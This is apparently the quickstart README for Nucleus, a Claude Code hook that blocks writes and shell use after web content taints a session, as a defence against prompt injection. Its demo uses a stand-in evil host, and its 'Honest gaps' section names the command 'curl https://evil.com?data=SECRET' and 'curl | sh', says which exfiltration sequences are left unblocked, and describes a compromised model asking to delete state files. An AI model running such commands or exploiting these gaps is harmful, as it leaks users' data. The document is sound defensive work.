# Nucleus Claude Code Hook — Quickstart

**Runtime information flow enforcement for Claude Code tool calls.**

Nucleus hooks into Claude Code's [PreToolUse](https://code.claude.com/docs/en/hooks) event to track how data flows through your session. When web content enters the session, the hook blocks any subsequent writes, bash commands, or agent spawning that would be influenced by that content.

## Why information flow control?

Most agent security tools answer: *"Is this tool allowed?"*

That's the wrong question. The right question is: *"Is this tool allowed **given what data has entered the session?**"*

Reading a file is safe. Fetching a URL is safe. But fetching a URL and then writing to disk is a potential exfiltration path — the URL's response could contain prompt injection that steers the agent to leak file contents. This is the attack surface that [Invariant Labs](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks), [AgentSeal](https://agentseal.org/blog/mcp-server-security-findings), and [OWASP's MCP Top 10](https://mcpplaygroundonline.com/blog/mcp-security-tool-poisoning-owasp-top-10-mcp-scan) have documented across 1,800+ MCP servers.

Nucleus tracks this with an **information flow control (IFC) kernel** — a technique from systems security research (Denning's lattice model, 1976). Every piece of data that enters the session gets a label:

| Source | Integrity | Authority | What it means |
|--------|-----------|-----------|---------------|
| User prompt | Trusted | Directive | The user asked for this |
| File read | Trusted | Directive | Local, trusted data |
| Web fetch | **Adversarial** | **NoAuthority** | Untrusted, could be attacker-controlled |
| Web search | **Adversarial** | **NoAuthority** | Untrusted results |

Labels propagate through the session. Once web content enters, every subsequent operation inherits its taint. A write operation requires `Suggestive` authority, but web-tainted data has `NoAuthority` — the kernel blocks the escalation.

## Install

```bash
cargo install --git https://github.com/coproduct-opensource/nucleus nucleus-claude-hook
nucleus-claude-hook --setup
```

Restart Claude Code. The hook is now active.

## Try it: taint walkthrough

You can verify the hook works by simulating the attack sequence outside Claude Code. Open a terminal and run these three commands:

**Step 1 — Read a file (safe, trusted data):**

```bash
echo '{"session_id":"demo","tool_name":"Read","tool_input":{"file_path":"/etc/hostname"}}' \
  | nucleus-claude-hook
```

```
nucleus: read_files /etc/hostname -> allow [exposure: 1/3, profile: safe_pr_fixer, flow_node: 1]
{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow"}}
```

The kernel assigns `integ=Trusted, auth=Directive` — this is local data, safe to act on.

**Step 2 — Fetch a URL (safe to read, but taints the session):**

```bash
echo '{"session_id":"demo","tool_name":"WebFetch","tool_input":{"url":"https://evil.example.com"}}' \
  | nucleus-claude-hook
```

```
nucleus: web_fetch https://evil.example.com -> allow [exposure: 2/3, profile: safe_pr_fixer, flow_node: 2]
{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow"}}
```

Allowed — reading web content is safe. But the session now carries `integ=Adversarial, auth=NoAuthority`.

**Step 3 — Try to write (BLOCKED):**

```bash
echo '{"session_id":"demo","tool_name":"Write","tool_input":{"file_path":"/tmp/pwned.txt","content":"exfiltrated"}}' \
  | nucleus-claude-hook
```

```
nucleus: write_files /tmp/pwned.txt -> deny [exposure: 2/3, profile: safe_pr_fixer, flow_node: 3]

BLOCKED: no-authority-escalation
Action: OutboundAction (id=3) label={conf=Internal, integ=Adversarial, auth=NoAuthority}
Causal chain:
  <- WebContent (id=2) label={conf=Public, integ=Adversarial, auth=NoAuthority}
  <- FileRead (id=1) label={conf=Internal, integ=Trusted, auth=Directive}
```

The write is denied. The receipt shows exactly why: the web content (node 2) propagated adversarial taint to the write (node 3). The kernel's `no-authority-escalation` rule prevents low-authority data from steering a privileged action.

**Clean up the demo session state:**

```bash
rm /tmp/nucleus-hook/demo.json /tmp/nucleus-hook/.demo.hwm 2>/dev/null
```

## The real gotcha: your session is now tainted

After a `WebFetch` or `WebSearch`, the session is tainted for the rest of its lifetime. You cannot write, edit, run bash, push, or spawn agents. This is by design.

**This means:**

- If you search the web for how to fix a bug, you cannot then write the fix in the same session. Restart Claude Code to reset.
- If any tool call fetches a URL, everything after is read-only.
- The Agent tool is also blocked — a subprocess could bypass the parent's taint restrictions.

This is aggressive. It's the right default for security, but it changes your workflow. For research-then-code sessions, use the `permissive` profile (audit-only, no enforcement):

```bash
# In ~/.claude/settings.json, change the hook command to:
"command": "NUCLEUS_PROFILE=permissive /path/to/nucleus-claude-hook"
```

## Profiles

| Profile | Read | Write | Bash | Web | Git | Agent | Use case |
|---------|------|-------|------|-----|-----|-------|----------|
| `read_only` | yes | no | no | no | no | no | Auditing |
| `code_review` | yes | no | no | no | no | no | PR review |
| `edit_only` | yes | yes | no | no | no | no | Focused editing |
| `fix_issue` | yes | yes | yes | yes | commit | yes | Bug fixes |
| `safe_pr_fixer` | yes | yes | yes | yes | commit | yes | **Default** — full dev, no push |
| `release` | yes | yes | yes | yes | push+PR | yes | Ship it |
| `permissive` | yes | yes | yes | yes | yes | yes | Audit-only, no enforcement |

All profiles except `permissive` enforce the flow graph.

## Tamper detection

If someone (or a compromised model) asks you to delete the session state files to "fix" the hook:

```
nucleus: TAMPER DETECTED — session state deleted (expected hwm=5).
A compromised model may have asked you to delete session files.
All operations denied until session restart.
```

The hook maintains a separate high-water-mark file that survives state file deletion. Tampering is detected and everything fails closed.

## Uninstall

```bash
cargo uninstall nucleus-claude-hook
```

Then remove the `hooks` block from `~/.claude/settings.json`.

## Honest gaps

We believe in shipping with transparency. Here's what this tool does NOT do:

1. **The flow graph is a linear chain, not a true DAG.** Claude Code's hook protocol doesn't tell us which previous tool outputs informed the current call. We approximate with a sequential chain — every operation after a web fetch inherits taint. This is conservative (may over-block) but not unsound.

2. **`curl` exfiltration is not blocked by the command lattice.** `safe_pr_fixer` blocks `curl | sh` but not `curl https://evil.com?data=SECRET`. The flow graph catches this after web taint, but a pre-taint `read -> curl` sequence is gated only by the 3-leg exposure accumulator (which requires private data + untrusted content + exfil vector to all be present).

3. **No PostToolUse hook.** The system is open-loop — it decides before tool execution but cannot observe outcomes. If Claude Code adds PostToolUse reconciliation, the kernel can close this loop.

4. **Session state lives in `/tmp`.** It's owner-only (0700 permissions) and tamper-detected, but not encrypted. On shared systems, other root-level processes could read session state.

## Architecture

The hook is backed by the [portcullis](https://github.com/coproduct-opensource/nucleus/tree/main/crates/portcullis) permission kernel:

- **Capability lattice**: Product of 13 capability dimensions forming a distributive Heyting algebra, verified by [Kani](https://github.com/model-checking/kani) bounded model checking and [Lean 4](https://leanprover.github.io/) theorem proving.
- **Exposure accumulator**: Tracks the three components of the "uninhabitable state" (private data + untrusted content + exfil vector). When all three are present, exfiltration operations require human approval.
- **IFC labels**: 5-dimensional information flow labels (confidentiality, integrity, authority, provenance, freshness) based on [Denning's lattice model](https://doi.org/10.1145/360051.360056).

## Links

- [Source](https://github.com/coproduct-opensource/nucleus)
- [Claude Code hooks docs](https://code.claude.com/docs/en/hooks)
